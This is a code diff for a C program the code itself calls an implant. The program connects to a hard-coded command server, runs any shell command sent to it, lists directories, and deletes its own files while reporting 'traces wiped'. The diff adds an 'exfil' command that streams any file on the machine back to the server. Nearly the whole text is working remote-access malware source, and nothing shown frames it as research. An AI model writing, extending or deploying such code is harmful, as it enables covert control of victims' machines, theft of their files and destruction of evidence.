@@ -6,12 +6,19 @@
 #include <arpa/inet.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <fcntl.h>
 
-#define SERVER_IP "192.168.65.254"  // Replace with C2 IP
+#define SERVER_IP "192.168.65.254"
 #define SERVER_PORT 4444
-#define BUF_SIZE 1024
+#define BUF_SIZE 2048
 
 int sock;
+
+void trim_newline(char *s) {
+    size_t len = strlen(s);
+    while (len && (s[len - 1] == '\n' || s[len - 1] == '\r'))
+        s[--len] = '\0';
+}
 
 int list_dir(const char *dir_path) {
     DIR *d = opendir(dir_path);
@@ -19,17 +26,37 @@ int list_dir(const char *dir_path) {
 
     struct dirent *entry;
     char msg[BUF_SIZE];
-
     while ((entry = readdir(d)) != NULL) {
         snprintf(msg, BUF_SIZE, "[*] %s\n", entry->d_name);
         send(sock, msg, strlen(msg), 0);
     }
-
-    // Marker to indicate end of directory listing
-    const char *end_marker = "[*] END\n";
-    send(sock, end_marker, strlen(end_marker), 0);
-
     closedir(d);
+
+    const char *end_msg = "[*] END\n";
+    send(sock, end_msg, strlen(end_msg), 0);
+    return 0;
+}
+
+int send_file(const char *file_path) {
+    FILE *fp = fopen(file_path, "rb");
+    if (!fp) {
+        const char *err = "[-] Failed to open file\n";
+        send(sock, err, strlen(err), 0);
+        return -1;
+    }
+
+    char buf[BUF_SIZE];
+    size_t n;
+    while ((n = fread(buf, 1, BUF_SIZE, fp)) > 0) {
+        if (send(sock, buf, n, 0) < 0) {
+            perror("[-] Send error");
+            break;
+        }
+    }
+    fclose(fp);
+
+    const char *end_msg = "\n[*] END\n";
+    send(sock, end_msg, strlen(end_msg), 0);
     return 0;
 }
 
@@ -56,6 +83,7 @@ int main() {
         memset(buffer, 0, BUF_SIZE);
         int n = read(sock, buffer, BUF_SIZE - 1);
         if (n <= 0) break;
+        trim_newline(buffer);
 
         if (strncmp(buffer, "exit", 4) == 0) break;
 
@@ -70,28 +98,32 @@ int main() {
             remove("/tmp/implant");
             remove("/tmp/implant_client");
             remove("/tmp/.i");
+
             send(sock, "Implant self-destructed and traces wiped\n", 41, 0);
             break;
         }
 
         if (strncmp(buffer, "list ", 5) == 0) {
-            char *dir_path = buffer + 5;
-            if (list_dir(dir_path) == -1) {
-                const char *err = "[-] Failed to list directory\n";
-                send(sock, err, strlen(err), 0);
-                const char *end_marker = "[*] END\n";
-                send(sock, end_marker, strlen(end_marker), 0);
-            }
+            char *dir = buffer + 5;
+            if (list_dir(dir) < 0)
+                send(sock, "[-] Failed to list directory\n", 30, 0);
             continue;
         }
 
+        if (strncmp(buffer, "exfil ", 6) == 0) {
+            char *file = buffer + 6;
+            if (send_file(file) < 0)
+                send(sock, "[-] File exfiltration failed\n", 30, 0);
+            continue;
+        }
+
+        // fallback: shell command
         FILE *fp = popen(buffer, "r");
         if (!fp) {
-            char *fail = "Command execution failed\n";
-            write(sock, fail, strlen(fail));
+            send(sock, "[-] Command execution failed\n", 30, 0);
         } else {
             while (fgets(buffer, BUF_SIZE, fp)) {
-                write(sock, buffer, strlen(buffer));
+                send(sock, buffer, strlen(buffer), 0);
             }
             pclose(fp);
         }
